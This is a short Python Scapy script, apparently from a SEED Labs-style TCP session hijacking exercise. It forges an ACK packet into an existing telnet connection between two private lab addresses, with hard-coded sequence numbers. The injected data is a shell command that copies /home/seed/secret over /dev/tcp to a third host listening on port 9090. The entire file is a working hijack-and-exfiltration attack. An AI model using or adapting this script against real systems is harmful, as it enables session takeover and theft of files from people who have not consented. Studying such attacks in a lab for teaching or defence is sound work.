#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING SESSION HIJACKING PACKET.........")
IPLayer = IP(src="10.0.2.5", dst="10.0.2.4")
TCPLayer = TCP(sport=57644, dport=23, flags="A",
               seq=1727979557, ack=435127836)
Data = "\r cat /home/seed/secret > /dev/tcp/10.0.2.15/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt,verbose=0)